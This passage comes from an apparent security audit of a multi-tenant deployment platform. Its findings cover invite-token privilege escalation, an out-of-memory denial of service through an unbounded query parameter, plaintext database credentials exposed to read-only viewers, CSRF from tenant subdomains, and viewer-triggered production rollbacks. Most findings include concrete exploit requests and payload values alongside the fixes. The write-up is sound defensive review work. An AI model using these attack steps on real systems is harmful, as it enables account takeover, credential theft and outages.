**Failure scenario.** Mallory holds role 'admin' on team T. She POSTs /api/teams/T/invite {email: 'mallory@her-own-domain.com', role: 'owner'}. The handler only gates on owner-OR-admin and then accepts 'owner' because it is in validRoles — there is no equivalent of the guard the role-update endpoint enforces. The invite email lands in her own inbox. She DELETEs herself from the team (the members DELETE handler at line 25 lets an admin remove another admin, including herself), then POSTs /api/invites/accept {token}. src/app/api/invites/accept/route.ts:44 calls acceptInvite, which writes a membership with role: invite.role = 'owner' without verifying that session.user.email matches invite.email. She is now team own

**Impact.** Vertical privilege escalation admin -> owner, defeating every owner-only control: promoting/demoting owners, removing owners, deleting the team (which cascades to deleting all team projects via deleteTeam -> deleteProject), and taking over billing.

**Reviewer correction.** Directionally correct, but restate the mechanism and lower the severity.

Accurate statement: `POST /api/teams/[id]/invite` gates on owner-OR-admin (line 39) and then accepts `role: 'owner'` (line 57) without the requester-role cross-check that the sibling PATCH endpoint enforces at `src/app/api/teams/[id]/members/[userId]/route.ts:115`. A team `admin` can therefore mint an owner-grade invite. The redemption token is returned directly in the 201 response body (line 87; `TeamInvite.token`, types/index.ts:107), and `POST /api/invites/accept` never checks that the session's email matches `invite.email` — so the admin redeems her own owner-invite immediately with a second HTTP call, and `acceptInvite` (db.ts:718) writes a membership with `role: 'owner'`. No email inbox, no control of the invited address, and no self-removal step is required; the finder's "invite lands in her inbox, then she DELETEs herself" path also works but is incidental (self-DELETE only makes the result deterministic, because `acceptInvite` does not dedupe and `getTeamMembership` uses an unordered `.limit(1)`). The exploit is also robust to a broken mailer, since the invite is persisted before `sendEmail` and is not rolled back on failure (lines 65 vs 76-82).

Two corrections to scope, in opposite directions:
- Wider than claimed: `GET /api/teams/[id]/invites` gates on bare membership and returns invite tokens, so a `viewer` can steal and redeem any pending owner-invite.
- Narrower than claimed: this is not reachable by an unprivileged or cross-tenant actor. Anonymous users, other tenants, and viewer/member roles are all stopped by the 403 at line 39; the attacker must already be `admin` on the target team, the blast radius is that single team, the only owner-exclusive capability gained is team deletion (`teams/[id]/route.ts:25`) plus the admin-vs-owner restrictions at members/[userId]:45/115/132, and both the issue and the redemption are audit-logged.

Fix: add `if (role === 'owner' && membership.role !== 'owner')` → 403 at the top of the invite handler, mirroring members/[userId]/route.ts:115; additionally bind redemption to the invited identity in `/api/invites/accept`, make `acceptInvite` reject or update an existing membership instead of inserting a duplicate, and strip `token` from the `GET /invites` response. | Accurate restatement: A team admin can self-promote to owner in two or three unauthenticated-by-nothing API calls, without any reliance on email delivery. (1) `POST /api/teams/{T}/invite` with `{email: <anything>, role: 'owner'}` — src/app/api/teams/[id]/invite/route.ts:39 gates only on owner-OR-admin and l.56 accepts 'owner' with no counterpart to the `members/[userId]/route.ts:115` guard. The 201 response returns `{ invite }`, which includes the raw `token` field, so the attacker holds the secret immediately; the email recipient is irrelevant. (2) Optionally `DELETE /api/teams/{T}/members/{self}` — allowed, since the DELETE guard only blocks admins from removing owners — so that the stale admin row cannot win the nondeterministic `.limit(1)` lookup in `getTeamMembership`. (3) `POST /api/invites/accept` with that token — the handler performs no `invite.email === session.user.email` check and no existing-membership check, and `acceptInvite` writes a membership with `role: invite.role`. The attacker is now owner and can delete the team, and remove or demote the legitimate owners. Secondary defect surfaced by the same trace: `GET /api/teams/[id]/invites` leaks live invite tokens to any member including `viewer`, so even the invite-creation step can be skipped if any owner-role invite is outstanding. Severity remains high — authenticated intra-tenant privilege escalation across a boundary the codebase explicitly enforces elsewhere; not critical because it requires an existing admin foothold and does not cross tenants.

**Verified code:**

```ts
src/app/api/teams/[id]/invite/route.ts:39 — gate admits admin:
    if (!membership || (membership.role !== 'owner' && membership.role !== 'admin')) {
            return NextResponse.json(
                { error: 'Forbidden. You must be an owner or admin to invite members.' },
                { status: 403, headers: securityHeaders }

src/app/api/teams/[id]/invite/route.ts:56-65 — cited line; 'owner' accepted with no requester-role cross-check:
        const validRoles = ['owner', 'admin', 'member', 'viewer'];
        if (!validRoles.includes(role)) {
             return NextResponse.json(
                { error: 'Invalid role' },
                { status: 400, headers: securityHeaders }
            );
        }

        const token = crypto.randomUUID();
        const invite = await createInvite(id, email, role as TeamRole, session.user.id, token);

src/app/api/teams/[id]/invite/route.ts:86-89 — the redemption token is handed straight back to the caller:
        return NextResponse.json(
            { invite },
            { status: 201, headers: securityHeaders }
        );

src/t
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the cited file in full plus every downstream helper, the sibling role-change endpoint, the redemption endpoint, `acceptInvite` in the DB layer, the invite-listing endpoint, and `src/proxy.ts`. The core assertion is factually correct and reachable over plain HTTP in production, so I cannot refute it — but the finder's stated mechanism is convoluted and, in two respects, understates the bug.

REACHABILITY (traced end to end):
1. `POST /api/teams/[id]/invite` is a real exported App Router handler. `src/proxy.ts` matches `/((?!favicon.ico|public/).*)` but applies only security headers and a 100-req/min IP rate limit to `/api/*`; its only auth gate is scoped to `pathname.startsWith('/dashboard') || pathname.startsWith('/new')`. No `/api/teams` gating, no `withAuth`/zod wrapper anywhere under `src/app/api/teams/` (grep returned nothing). The handler's own `getSession()` + membership check is the entire gate. `MOCK_DB` is only consulted in `src/lib/firebase.ts`, never on this path, so NODE_ENV=production / MOCK_DB unset changes nothing.
2. Line 39 admits `owner` OR `admin`. Line 57's `validRoles` includes `'owner'`, and there is genuinely no analogue of the PATCH guard at `members/[userId]/route.ts:115`. Line 65 persists `role` verbatim.
3. `acceptInvite` (db.ts:718) copies `invite.role` straight into a new `TeamMembership` with no checks.

WHERE THE FINDER IS WRONG (mechanism is more direct, and the guard gap is wider than described):
- The email inbox and the self-DELETE dance are both unnecessary. `TeamInvite` (types/index.ts:102-111) includes `token`, and line 87 returns `{ invite }` — the raw redemption token comes back in the 201 response body. Mallory never needs to receive or control the invited address. The invite is also created (line 65) *before* `sendEmail` (line 70), and an email failure returns 500 without deleting it, so the exploit survives a broken mailer.
- `/api/invites/accept` never compares `session.user.email` to `invite.email`, and `acceptInvite` never checks for an existing membership — so she can redeem her own owner-invite while still holding her admin row, producing a duplicate membership. Deleting herself first (which the DELETE handler does permit: line 45 only blocks admins from removing *owners*) merely makes the outcome deterministic, since `getTeamMembership` uses an unordered `.limit(1)`.
- Broader, and unclaimed: `GET /api/teams/[id]/invites` gates on bare membership only ("if (!membership)") and returns full invite objects *including tokens*. Any `viewer` can steal and redeem any pending invite.

WHERE TH

</details>

### 🟠 HIGH — Analytics aggregation performs an unbounded Firestore read over a caller-controlled time range
`tenancy-data-8` · `src/lib/analytics.ts:93`  _(reviewers changed severity: medium → **high**)_

**Failure scenario.** `period` is taken straight off the query string — src/app/api/projects/[id]/analytics/stats/route.ts:16 `searchParams.get('period') || '30d'` — and passed through to parseInt with no ceiling. Any authenticated user with access to a project (including a team member with role 'viewer') requests GET /api/projects/<id>/analytics/stats?period=999999d. startDate moves ~2700 years into the past, so the predicate matches every analytics_events document ever written for that project, and the query has no .limit(). All matching documents are materialised into `snapshot.docs` and then into the `events` array, plus a `treatedPageviews` Set and a per-day visitor Set built over all of them. Repeating the 

**Impact.** A single low-privilege tenant can exhaust the memory of the shared application server — taking down the dashboard and the /api/v1/proxy path for every other tenant on the instance — and can run up unbounded Firestore document-read billing.

**Reviewer correction.** Accurate restatement: the analytics stats endpoint accepts an unvalidated, unbounded caller-controlled `period` and uses it as an allocation count, not just as a time filter. The severe sink is `getMockData()` at src/lib/analytics.ts:189-191, which does `Array.from({ length: parseInt(period) }, ...)` building a Date per element. It is reached on BOTH the empty-result branch (line 100) and the catch-all error branch (line 184) of `getAnalyticsStats`, so any project with no BigQuery rows — including a brand-new project with zero analytics data — lands there. Any authenticated tenant (own project, or a team member of ANY role including 'viewer', since src/app/api/projects/[id]/analytics/stats/route.ts never inspects `access.role`) can send GET /api/projects/<id>/analytics/stats?period=99999999d and fatally OOM the Node process — I reproduced a hard, uncatchable V8 out-of-memory abort at that value under a 400MB heap cap, against a configured Cloud Run limit of 512Mi / 1 CPU / maxInstances 10. A milder value, period=999999d, costs a measured 669ms of pegged CPU and ~106MB heap per request, and src/proxy.ts permits 100 such requests per minute per IP (its rate-limit key `${ip}:${pathname}` excludes the query string, and the Map is per-instance). This is a single-request availability DoS against a multi-tenant PaaS from a free signup, which is why it rates high rather than medium.

The Firestore read at line 93 that the claim anchors on is real (no `.limit()`, correctly observed) but is the secondary issue: `getStatsFromBigQuery` short-circuits before it whenever BQ has rows, firestore.indexes.json declares no `analytics_events` composite index so the query may simply throw into the catch, and when it does run its size is bounded by that one project's own event count — which the default 30d window would largely read regardless. The right fix covers both: clamp `days` (e.g. `Math.min(Math.max(parseInt(...) || 30, 1), 365)`) once at the top of `getAnalyticsStats`, apply the same clamp inside `getMockData` since it is exported and parses `period` independently, and add a `.limit()` to the queries at lines 93 and 242. | Not a tenancy/data-exposure issue, and the named mechanism is the weaker of the two. Correct restatement: **unvalidated caller-controlled `period` reaches an unbounded array allocation in `getMockData()`, letting any authenticated project member crash the shared Node process with one GET.**

Three corrections to the finder's write-up:

1. **No cross-tenant read.** The Firestore query at analytics.ts:93 is `.where('projectId','==',projectId)` where `projectId` already passed `checkProjectAccess()` (stats/route.ts:25-32, rbac.ts:8-32). A `viewer` can only widen the window over *their own project's* events. Nothing another tenant owns is reachable. The `tenancy-data` classification is wrong; this is availability, not confidentiality.

2. **The Firestore read alone is low severity.** `period=999999d` only escalates "30 days of this project's events" to "all of this project's events" — bounded by traffic the caller's own project generated, and in production usually skipped entirely because `getStatsFromBigQuery()` short-circuits at line 62-64 when BQ returns rows.

3. **The actually-serious path is the one the finder walked past.** `getMockData(period)` is called at analytics.ts:100 (`if (snapshot.empty)`) and :185 (catch-all), and re-parses the same raw string at :190 before `Array.from({ length: days }, ...)` at :191 — allocating one object plus a `Date` per day with no ceiling. `GET .../analytics/stats?period=50000000d` on any project with no analytics events in range (or any project at all, since the composite index `analytics_events(projectId ASC, timestamp DESC)` is absent from firestore.indexes.json, so the query at :93 should throw FAILED_PRECONDITION straight into the catch at :183) reaches it deterministically.

I reproduced the allocation under a 512 MB heap — a typical Cloud Run limit. It is a **fatal V8 heap OOM, not a catchable exception**, so the `try/catch` wrapping lines 57-186 provides no protection: the process aborts, taking every other tenant served by that instance with it.

Mitigations that exist but do not cover this: session auth (route:13-23) and RBAC (route:25-32) reduce the attacker set to authenticated project members, not to trusted parties on a self-serve PaaS; the proxy.ts:124 limiter (100 req/min per `ip:pathname`) is irrelevant because one request suffices, and it allows ~100 instance kills per minute per IP. The BigQuery branch is clean — `@days` at analytics.ts:34/42 is a real query parameter, no injection.

Fix belongs at the parse, not the query: clamp in `getAnalyticsStats` (e.g. `Math.min(Math.max(parseInt(...) || 30, 1), 365)`) so both the Firestore range and `getMockData` inherit the ceiling, and add `.limit()` at :93 and :242 as defence in depth.

**Verified code:**

```ts
src/app/api/projects/[id]/analytics/stats/route.ts:16,28-34
    16:  const period = searchParams.get('period') || '30d';
    26:  const access = await checkProjectAccess(session.user.id, id);
    28:  if (!access.allowed) { ... }
    34:  const stats = await getAnalyticsStats(id, period);
  (no role check on `access.role` anywhere in the file)

src/middleware/rbac.ts:17-27
    17:  if (project.teamId) {
    19:      const membership = await getTeamMembership(project.teamId, userId);
    20:      if (membership) {
    21:          return { allowed: true, project, role: membership.role };
    25:      if (project.userId === userId) {
    26:          return { allowed: true, project, role: 'owner' };
  -> any role, including 'viewer', is `allowed: true`

src/lib/analytics.ts:57-61 (parse, no ceiling)
    57:  const days = parseInt(period.replace('d', '')) || 30;
    61:  const bqRows = await getStatsFromBigQuery(projectId, days);

src/lib/analytics.ts:87-101 (the cited read, and the branch the finder missed)
    87:  const now = new Date();
    88:  const startDate = new Date();
    89:
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: fully confirmed, no implausible preconditions.

1. Entry point is real and unprivileged. `src/app/api/projects/[id]/analytics/stats/route.ts` GET calls `getSession()` then `checkProjectAccess(session.user.id, id)`. `getSession()` (src/lib/auth.ts:88-106) requires a real signed JWT when NODE_ENV=production and MOCK_DB is unset — so this is an authenticated-tenant attack, exactly as claimed. `checkProjectAccess` (src/middleware/rbac.ts) returns `{allowed:true, role: membership.role}` for ANY team role, and `{allowed:true, role:'owner'}` for a self-created personal project. The route does zero role gating after the access check. So a free self-signup tenant, or a 'viewer' team member, reaches `getAnalyticsStats(id, period)` with a fully attacker-controlled `period`.

2. `period` is unvalidated end to end. Grepped: the only occurrences are the two lines in the route; there is no zod/validation layer, no ceiling, no allowlist. `parseInt(period.replace('d',''))` is the sole parsing.

3. Line 93 is verbatim as claimed and has no `.limit()`. Confirmed by line-numbered read.

WHERE THE CLAIM IS WRONG — the cited line 93 is the WEAKER of the two hazards, and the finder missed the dominant one 96 lines below.

(a) Line 93 is frequently not reached. `getStatsFromBigQuery` runs first (line 61); when the project has BQ rows the function returns at line 82 and Firestore is never queried. And there is no composite index for `analytics_events` (projectId ASC + timestamp) in firestore.indexes.json — the file defines indexes only for projects/deployments/envVars — so if the deployed index set matches the repo the query at 93 raises FAILED_PRECONDITION and is swallowed by the catch at 182. Even when it does execute, the read is bounded by that one project's own event count, which the default 30d window would largely read anyway (events are written by /api/v1/collect at ~20 req/min/IP). So `period` is a poor amplifier for the Firestore read specifically; the missing `.limit()` is the real defect there and it applies equally at 30d.

(b) The genuinely uncapped, `period`-proportional work is `getMockData(period)` at src/lib/analytics.ts:189-191, and BOTH failure branches funnel into it: line 100 `if (snapshot.empty) return getMockData(period)` and line 185 (catch) `return getMockData(period)`. It does `Array.from({ length: days }, ...)` constructing a `new Date()` + `toISOString()` per element, with `days` taken straight from the query string.

This makes reachability strictly BETTER than the claimed path, not worse — every route leads there. A bran

</details>

### 🟠 HIGH — IaC export endpoint returns the plaintext database connection string to viewers with no role gate
`webhooks-billing-2` · `src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts:40`  _(reviewers changed severity: critical → **high**)_

**Failure scenario.** A team member holding the read-only `viewer` role (TeamRole is 'owner'|'admin'|'member'|'viewer', src/types/index.ts:75) issues `GET /api/projects/<id>/storage/<storageId>/export/iac?format=env`. The handler only calls checkProjectAccess and never inspects access.role, so it fetches the connector secret from GCP Secret Manager and returns e.g. `DATABASE_URL="postgresql://app:S3cr3t@10.0.0.5:5432/prod"` as a downloadable file.

**Impact.** Full production database credentials (Cloud SQL / Supabase / PlanetScale / MongoDB Atlas / Redis) are handed to a principal the product explicitly treats as read-only, defeating the entire Secret Manager design. The attacker gets direct network-level DB access outside every guardrail (query masking, audit logging, row limits) the app applies.

**Reviewer correction.** The finding is correct in mechanism and location; two refinements. (1) The actor is narrower than "unprivileged": exploitation requires an authenticated user who has been deliberately invited to the team with the `viewer` role. It is not reachable anonymously or by an arbitrary signed-up tenant — `checkProjectAccess` returns 403 without a team-membership row — and it does not apply to personal projects, where `!project.teamId` makes the requester role `'owner'`. Hence high rather than critical. (2) The exposure is broader than the claimed `?format=env`: because `format` defaults to `'json'` (line 36) and `json` is the `default` switch case (line 139), a bare `GET /api/projects/<id>/storage/<storageId>/export/iac` with no query string returns the plaintext DSN in the `connectionString` field. The `yaml` (line 131) and `kubernetes` (line 108, base64-encoded, which is encoding rather than protection) formats leak it too — only `terraform` does not. Two aggravating facts the finder did not note: the route calls no `logAuditEvent`, unlike its export/rotate/clone/import siblings, so the credential theft leaves no audit trail; and the same codebase deliberately masks query results from viewers at query/route.ts:943, a control this route silently defeats by handing over the raw credential. Fix: insert the standard four-line gate after the `access.allowed` check, matching export/route.ts:30-32, and add a `logAuditEvent` call for the export. | Directionally correct and confirmed, with two amplifications and one severity adjustment. Amplifications: (a) the leak is not specific to `?format=env` — the default `json` branch (L138-148) also emits the plaintext `connectionString`, so a bare `GET /api/projects/<id>/storage/<storageId>/export/iac` with no query string leaks it, as do `yaml` (L124-137) and `kubernetes` (L98-114, base64-encoded and trivially decoded); (b) the route calls no `logAuditEvent`, unlike sibling export/route.ts, so the disclosure leaves no audit trail. Severity adjustment: high rather than critical, because exploitation requires an authenticated principal already granted a `viewer` membership on the target project by an owner/admin — checkProjectAccess still returns 403 to non-members, so this is an internal privilege-escalation/secret-disclosure, not an unauthenticated or cross-tenant exposure. Fix is a one-liner matching the established pattern at export/route.ts:30 and env/[envId]/reveal/route.ts:29: insert `if (access.role === 'viewer') return NextResponse.json({ error: 'Forbidden' }, { status: 403 });` after L26, and add audit logging.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts — the gate that is missing (note line 28 destructures `project` and discards `role`):

    22	        const access = await checkProjectAccess(session.user.id, id);
    23	
    24	        if (!access.allowed) {
    25	            return NextResponse.json({ error: access.error }, { status: access.status });
    26	        }
    27	
    28	        const { project } = access;
    29	        const storage = project.storageConfigs?.find(s => s.id === storageId);
...
    35	        const { searchParams } = new URL(request.url);
    36	        const format = searchParams.get('format') || 'json';
    37	
    38	        let connectionString = '';
    39	        if (storage.connectionStringSecretId) {
    40	            connectionString = await getSecretValue(storage.connectionStringSecretId) || '';
    41	        }

Same file — the plaintext reaching the response body, including the DEFAULT json branch (no query param needed):

   115	            case 'env':
   116	                content = `# Deployify Connector: ${storage.name
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read all 167 lines of the cited route and traced the chain from HTTP entry to the secret read. The claim holds; it is live, reachable code, not dead or dev-gated.

REACHABILITY, step by step (NODE_ENV=production, MOCK_DB unset):

1. Entry point is real. `src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts` exports `GET` and is the only route file at that path (siblings are `export/route.ts` and `export/pdf/route.ts`). A live UI calls it: `src/components/IaCExportModal.tsx:41` fetches `/api/projects/${projectId}/storage/${storage.id}/export/iac?format=${format}`.

2. No global gate intercepts it. `src/proxy.ts` is the only middleware (no `middleware.ts` anywhere). For `/api/*` it applies security headers and IP rate limiting (100 req/min) and nothing else; its auth check is scoped to `pathname.startsWith('/dashboard') || pathname.startsWith('/new')`. So the handler's own `getSession()` + `checkProjectAccess()` are the entire authorization boundary.

3. No dev-only shortcut is needed. `getSession()` (src/lib/auth.ts:88-106) returns `MOCK_SESSION` only when the token is absent AND (`NODE_ENV === 'development'` || `MOCK_DB === 'true'`); in production it goes to `verifySessionToken(token)`. A normally signed-in user reaches the handler.

4. The role is available and discarded. `checkProjectAccess` (src/middleware/rbac.ts:19-21) returns `{ allowed: true, project, role: membership.role }` verbatim for ANY team-membership row, with no role filtering. Line 28 of the iac route destructures `const { project } = access;` — it takes the project and throws away `role`. I grepped the whole file: the string `viewer` does not appear. Every sibling the finder cited does have the gate, and I confirmed each one verbatim (export:30, rotate:29, clone:27, import:30, ingest:23, cutover:23, plus storage/route.ts POST:75 and apply-index:32).

5. `viewer` is a real, assignable role. `TeamRole = 'owner' | 'admin' | 'member' | 'viewer'` (src/types/index.ts:75), and it is in `validRoles` at both `teams/[id]/invite/route.ts:56` and `teams/[id]/members/[userId]/route.ts:97`. Note the gap only applies to team projects — a personal project (`!project.teamId`) yields role `'owner'`, so the actor must be an invited team member.

6. The secret read actually works — this is the part I most expected to break the claim, and it does not. `getSecretValue` (src/lib/gcp/secrets.ts:141-158) expects a FULL resource name including version. `upsertSecret` returns exactly `` `${secretName}/versions/latest` `` = `projects/<gcpProject>/secrets/<id>/versions/latest`, and that

</details>

### 🟠 HIGH — No CSRF token or Origin/Sec-Fetch-Site check on any of the 84 API route handlers, and SameSite=Lax provides no protection because attacker-controlled HTML is served from same-site sibling subdomains
`xss-frontend-sec-3` · `src/lib/auth.ts:120`

**Failure scenario.** `grep -rniE "origin|sec-fetch|referer" src/app/api src/proxy.ts src/middleware` returns zero validation hits — the only `csrf` string in the codebase is the OAuth `state` for the login flow. Because tenant apps are proxied at `<slug>.<app-domain>`, an attacker's deployed app is *same-site* with the dashboard, so SameSite=Lax does not block its subresource requests. Attacker page on `attacker.<app-domain>` runs `fetch('https://<app-domain>/api/projects', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({repoFullName:'attacker/backdoor'})})`. `text/plain` keeps it a CORS *simple* request, so no preflight is sent and the request executes; `await

**Impact.** Any victim who visits any page on any tenant's Deployify-hosted site can have state changed in their own Deployify account: a project created from an attacker-controlled repository (which persists an encrypted copy of the victim's `repo`-scoped GitHub token and wires up a webhook-triggered build pipeline in the victim's GCP project), environment variables added via `POST /api/projects/[id]/env`, a

**Reviewer correction.** Accurate restatement: No API route handler validates request provenance (no CSRF token, no Origin/Referer/Sec-Fetch-Site check, no custom-header or content-type requirement); the only `csrf` string in the tree is the OAuth `state`. Authentication is ambient-cookie-only — `getSession()` reads `deployify_session` and `checkProjectAccess()` authorizes the user, so both pass on a forged cross-origin request. SameSite=Lax does block a plain third-party attacker, but it is neutralized by a foothold the product hands out for free: src/proxy.ts rewrites `<slug>.<app-domain>` to the tenant proxy, which returns the tenant's arbitrary HTML verbatim, so any deployed app is attacker-controlled JS on an origin same-site with the dashboard. Exploitation is limited to CORS "simple requests" — POST/GET with `text/plain`, urlencoded, or multipart bodies — because DELETE/PATCH/PUT or `application/json` triggers a preflight these routes never answer. That limit is not a defense: no handler checks content type, and `Request.json()` parses a `text/plain` body regardless (verified empirically), so `POST /api/projects/<id>/env`, `/deploy`, `/rollback` and the storage `rotate`/`restore`/`cutover` handlers all execute. Writes are blind (responses unreadable cross-origin), making this an integrity/availability issue rather than exfiltration, and ID-scoped targets need a projectId that is not blind-guessable (`generateId()` uses `Math.random()`) but is leaked to third parties by the public dashboard share link `/share/dashboard/<widgetId>?p=<projectId>`. Unrelated but worth noting as already-mitigated: the session cookie is host-only (no `domain` attribute), which is the only thing preventing the tenant proxy's blanket header forwarding from leaking the victim's session JWT to tenant Cloud Run services. | Accurate restatement: No API route validates Origin, Sec-Fetch-Site, Referer, or a CSRF token; session state-change authority rests entirely on the SameSite=Lax cookie set at src/lib/auth.ts:120. Because src/proxy.ts:86-108 serves each tenant's arbitrary deployed HTML from `<slug>.<app-domain>` (and the same handler is also reachable same-origin at `/api/v1/proxy/<slug>/` on the apex), attacker-controlled script runs inside the cookie's own site, so SameSite=Lax withholds nothing. This yields a blind, write-only CSRF against the 44 POST handlers.

Two scope corrections to the original wording:

(1) Not "any of the 84 API route handlers." 84 is the route-*file* count; the method census is 44 POST / 14 DELETE / 7 PATCH / 1 PUT / 47 GET. The DELETE/PATCH/PUT handlers are NOT cross-origin reachable: those methods are not CORS-safelisted, so the browser sends a preflight, and no credentialed route emits Access-Control-Allow-Origin (the only ACAO in the codebase is `*` on the anonymous /api/v1/collect OPTIONS, which cannot serve credentialed requests). Those preflights fail and the real request is never sent. So the destructive DELETE /api/projects/[id] path is not part of this bug. The 44 POST handlers ARE fully exploitable, because they call `await request.json()` with no Content-Type check, and Request.json() parses a `Content-Type: text/plain` body — a CORS-simple request needing no preflight.

(2) It is blind CSRF, not session riding with read access. No route reflects Origin and none allows credentialed CORS, so the attacker cannot read responses from the sibling-subdomain origin. Impact is therefore write-only and split by whether the target needs an id: ID-less POSTs (POST /api/projects — creates a project and triggers a build/deploy billed to the victim; POST /api/teams; POST /api/billing/checkout; POST /api/auth/logout) are firable by any tenant at any lured victim, while the high-value per-project POSTs (env, deploy, rollback, storage restore/cutover/clone, domains, teams/[id]/invite) require an id the attacker already knows. That precondition is trivially satisfied by a 'viewer' team member, which is the sharpest exploit: a viewer is explicitly denied env writes at env/route.ts:74-79, but can deploy a page at `<their-slug>.<app-domain>`, lure the project owner, and perform those same writes with the owner's role — a real viewer-to-owner escalation reachable by an unprivileged actor in production.

Severity stays high (not critical): real unprivileged actor, real production path, but it requires a victim lure, is write-only, and cannot reach the DELETE/PATCH handlers. Note also that this defect is independent of, and not fixed by, closing the same-origin `/api/v1/proxy/<slug>/` HTML-serving hole reported separately — the sibling-subdomain path keeps CSRF live on its own.

**Verified code:**

```ts
src/lib/auth.ts:88-106 — cookie-only ambient session, no provenance check:
  88	export async function getSession(): Promise<Session | null> {
  89	    const cookieStore = await cookies();
  90	    const token = decodeURIComponent(cookieStore.get(COOKIE_NAME)?.value || '');
 105	    return verifySessionToken(token);

src/lib/auth.ts:111-124 — the cited line 120; note `sameSite: 'lax'` and the ABSENCE of a `domain` attribute (host-only):
 111	export async function setSessionCookie(token: string): Promise<void> {
 115	    const isSecure = config.appUrl.startsWith('https://');
 117	    cookieStore.set(COOKIE_NAME, token, {
 118	        httpOnly: true,
 119	        secure: isSecure,
 120	        sameSite: 'lax',
 121	        path: '/',
 122	        maxAge: 7 * 24 * 60 * 60, // 7 days
 123	    });

src/lib/auth.ts:160-167 — the only CSRF construct in the codebase, scoped to OAuth login:
 160	/**
 161	 * Generate OAuth state for CSRF protection
 162	 */
 163	export function generateOAuthState(): string {

src/app/api/projects/[id]/env/route.ts:54-83 — representative mutating handler: authn 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for an existing mitigation and found none. Every candidate guard fails:

1. NO ORIGIN/REFERER/SEC-FETCH CHECK ANYWHERE. `grep -rniE "sec-fetch|origin|referer|csrf|x-requested-with" src/` over the whole tree returns exactly four non-noise hits: the `Referrer-Policy` response header in src/proxy.ts:16 and src/lib/security/index.ts:127 (a response directive, not a request check), a `referer` value read purely for analytics logging in the tenant proxy, and the OAuth `state` in src/app/api/auth/{github,callback}. The finder's grep result reproduces exactly.

2. NO WRAPPER TO HIDE A GUARD IN. There is no `withAuth`/`withCsrf` HOF — `grep -rn "withAuth|requireAuth|verifyRequest" src/lib src/middleware src/app/api` returns only the unused `requireAuth` declaration at src/lib/auth.ts:142. All 77 route files inline `getSession()` themselves.

3. THE AUTH/RBAC CHECKS ARE NOT A MITIGATION. `getSession()` (src/lib/auth.ts:88-106) reads the ambient `deployify_session` cookie, and `checkProjectAccess()` (src/middleware/rbac.ts) authorizes the *user*, not the *request origin*. In a CSRF the browser supplies the victim's own valid cookie, so both checks pass. This is the classic case where authn+authz is present and CSRF defense is still absent.

4. NO CONTENT-TYPE GUARD, AND THAT MATTERS. `grep -rn "content-type" src/app/api --include=route.ts` finds a content-type read only in the tenant proxy's *response* handling. No handler validates the request content type, and I empirically confirmed the Fetch `Body.json()` mixin ignores it: `node -e "new Request(...,{headers:{'Content-Type':'text/plain;charset=UTF-8'},body:JSON.stringify({key:'PWNED'})}).json()"` printed `json() parsed despite text/plain -> {"key":"PWNED","value":"1"}`. So a CORS "simple request" (no preflight) reaches the handler body intact.

5. NO FRAMEWORK DEFAULT SAVES IT. These are Route Handlers, not Server Actions, so Next.js's built-in Server-Action Origin check does not apply. next.config.ts adds only `X-DNS-Prefetch-Control`; there is no CSP. `X-Frame-Options: DENY` blocks framing/clickjacking, not `fetch`/form CSRF. No test anywhere pins CSRF behaviour.

6. THE SAME-SITE PREMISE IS REAL, NOT ASSUMED. src/proxy.ts rewrites `<slug>.<baseHostname>` to `/api/v1/proxy/<slug>` (with a reserved list of `www`, `api`, `dashboard`, …, implying the dashboard sits at the apex/www of the *same* registrable domain), and the proxy route returns the tenant's arbitrary HTML body verbatim (it even strips `x-frame-options` from the tenant response and injects a script tag). So an att

</details>

### 🟡 MEDIUM — Production traffic rollback and Cloud Run alias retargeting are open to viewers
`authn-session-7` · `src/app/api/projects/[id]/deployments/[deployId]/rollback/route.ts:22`

**Failure scenario.** A `viewer` on a team project POSTs to `/api/projects/<id>/deployments/<any old ready deployId>/rollback`. The only gate is `checkProjectAccess`, which returns allowed for viewers, so `updateTraffic` shifts 100% of the production Cloud Run service to a stale revision — reverting the live site to old code, potentially reintroducing a patched vulnerability. The same gap exists at src/app/api/projects/[id]/rollback/route.ts:26-33 (POST with an arbitrary `revisionName`) and at src/app/api/projects/[id]/deployments/[deployId]/alias/route.ts:24 / :97, where POST and DELETE let a viewer create or tear down Cloud Run traffic tags and, via `removeAliasFromOtherDeployments`, steal an alias such as `sta

**Impact.** A read-only principal can cause a production outage or silently roll back a security fix, and can hijack or delete named preview aliases — all while the audit log records the action as an ordinary rollback rather than a privilege violation.

**Reviewer correction.** The claim's mechanism is accurate as written. Two refinements worth carrying into the fix: (a) the sibling route `src/app/api/projects/[id]/rollback/route.ts` is strictly worse than described — it also lacks the role check, and additionally takes `revisionName` straight from the request body with no deployment lookup, no `projectId` binding, and no `status === 'ready'` check, so a viewer can point 100% of production traffic at any revision string in that service, including one that was never a tracked deployment; it calls `logAuditEvent` for 'deployment.rollback', but that is detective, not preventive. (b) `src/app/api/projects/[id]/deployments/[deployId]/alias/route.ts` is missing the check on BOTH `POST` (line 25) and `DELETE` (line 98), so a viewer can both attach and detach preview alias tags. Fix is the one-line pattern already used at `src/app/api/projects/[id]/deploy/route.ts:44`: `if (access.role === 'viewer') return 403;` in all four handlers. | Confirmed and reachable, with three refinements to the mechanism. (1) Scope: this is intra-tenant privilege escalation only — an authenticated team member holding the intentionally read-only `viewer` role. Anonymous users hit the 401 at line 18-20, and non-members hit 403 from checkProjectAccess, so there is no unauthenticated or cross-tenant reach. (2) Impact is not conditional on running on GCP: off-GCP the traffic call is skipped but the DB is still mutated — the rollback route unconditionally creates a fabricated `status: 'ready'` production deployment record (line 55-66), and the alias route unconditionally calls removeAliasFromOtherDeployments + updateDeployment, so a viewer can poison deployment history and steal alias ownership either way. (3) The affected set is three routes, and the sibling src/app/api/projects/[id]/rollback/route.ts is the weakest of them: it accepts `revisionName` directly from the request body with no deployment lookup and no status check, whereas the cited nested route at least enforces `targetDeployment.projectId !== id` and `status === 'ready'`. Aggravating factor the finder did not note: neither the nested rollback route nor the alias route calls logAuditEvent (grep count 0 for both), while the project-level rollback route logs three times — so a viewer-triggered traffic shift through the nested route leaves no audit trail beyond the gitCommitAuthor field on the synthetic deployment record. Fix is the one-liner already used at ~20 sibling endpoints: `if (access.role === 'viewer') return 403` after 